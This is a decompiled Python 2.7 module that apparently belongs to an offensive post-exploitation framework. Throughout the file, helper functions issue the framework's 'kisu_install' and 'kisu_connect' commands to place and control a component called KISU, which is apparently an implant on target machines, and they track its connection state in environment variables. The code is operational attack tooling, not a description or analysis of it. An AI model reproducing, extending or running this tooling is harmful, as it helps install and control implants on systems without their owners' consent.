# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: __init__.py
import demi.windows
import demi.registry
import dsz.env
import re
ConnectedEnv = '_DEMI_KISU_COMMS_ESTABLISHED'
KiSuEnabledEnv = '_DEMI_KISU_ENABLED'

def IsConnected():
    id = ConnectedId()
    return id != None


def ConnectedId():
    curId = None
    try:
        curId = int(dsz.env.Get(ConnectedEnv), 16)
        if curId == 0:
            return
        return curId
    except:
        return

    return


def UseKiSu():
    if not IsConnected():
        return False
    try:
        state = dsz.env.Get(KiSuEnabledEnv)
        if state.lower() in ('true', 'enabled', 'on', '1', 'go', 'use'):
            return True
    except:
        pass

    return False


def EnableKiSu():
    dsz.env.Set(KiSuEnabledEnv, 'on')
    return True


def DisableKiSu():
    dsz.env.Set(KiSuEnabledEnv, 'off')
    return True


def IsKisuAvailable(instance=None, type=None):
    return dsz.cmd.Run('available -command kisu_install')


def InstallKiSu(instance=None, type=None):
    dsz.ui.Echo('entered')
    instanceId = '-type PC'
    if instance != None:
        instanceId = '-instance 0x%08x' % instance
    if type != None:
        instanceId = '-type %s' % type
    return dsz.cmd.Run('kisu_install %s' % instanceId)


def ConnectKiSu(instance=None, type=None):
    instanceId = '-type PC'
    if instance != None:
        instanceId = '-instance %s' % instance
    if type != None:
        instanceId = '-type %s' % type
    return dsz.cmd.Run('kisu_connect %s' % instanceId)


def DisconnectKiSu():
    return dsz.cmd.Run('kisu_disconnect')


def EnsureConnected(ask=True):
    if demi.IsConnected():
        return True
    if not ask:
        dsz.ui.Echo('* Not currently connected to a KISU instance', dsz.ERROR)
        return False
    dsz.ui.Echo('* Not currently connected to a KISU instance', dsz.WARNING)
    try:
        str = dsz.ui.GetString('What KISU would you like to connect to?', 'pc')
    except:
        return False

    key = '-type'
    try:
        if re.match('^([0-9]+)|(0[xX][0-9a-fA-F]{1,8})$', str):
            key = '-instance'
    except:
        pass

    dsz.ui.Echo('Loading KISU tool')
    if not dsz.cmd.Run('available -command kisu_connect -load'):
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        dsz.ui.Echo('* Unable to load KISU tool', dsz.ERROR)
        return False
    dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    dsz.ui.Echo('Attempting to connect to KISU %s' % str)
    if not dsz.cmd.Run('kisu_connect %s %s' % (key, str)):
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        dsz.ui.Echo('* Unable to connect to a KISU instance', dsz.ERROR)
        return False
    dsz.ui.Echo('    SUCCESS', dsz.GOOD)


def TranslateIdToName(id):
    Unknown = 'Unknown'
    if id == None:
        return Unknown
    else:
        try:
            import demi.mcf.kisu.ids
            for name in demi.mcf.kisu.ids.nameTable:
                if demi.mcf.kisu.ids.nameTable[name] == id:
                    return name

        except:
            pass

        return Unknown


def TranslateNameToId(Name):
    Unknown = 0
    if Name == None:
        return Unknown
    else:
        try:
            import demi.mcf.kisu.ids
            for kisuName in demi.mcf.kisu.ids.nameTable:
                if kisuName.lower() == Name.lower():
                    return demi.mcf.kisu.ids.nameTable[kisuName]

        except:
            pass

        return Unknown